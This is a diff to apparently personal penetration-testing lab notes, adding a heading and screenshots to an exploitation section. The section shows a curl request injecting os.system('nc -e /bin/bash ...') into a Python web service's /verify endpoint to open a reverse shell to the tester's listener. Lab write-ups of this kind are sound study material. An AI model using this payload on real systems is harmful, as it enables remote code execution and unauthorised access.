@@ -292,11 +292,16 @@ Enumerated top 200 UDP ports:
 
 # Exploitation
 ## Name of the technique
-
+## os.system  Command Execution
 #### -As found from the nmap scan port 50000 is running python 3.6 I typed "os" as a module and find the following showing the existence of it running python 3.6 module:
 ![](Pasted%20image%2020221016153044.png)
 
 #### -Ran a netcat listener on port 18000 and typed "curl -X POST --data "code=os.system('nc -e /bin/bash [kali IP] 18000')" http://192.168.241.117:50000/verify" and got a reverse shell:
+
+![](Pasted%20image%2020221016154924.png)
+#os.systemCommandExecution
+
+![](Pasted%20image%2020221016155012.png)
 
 ---
 
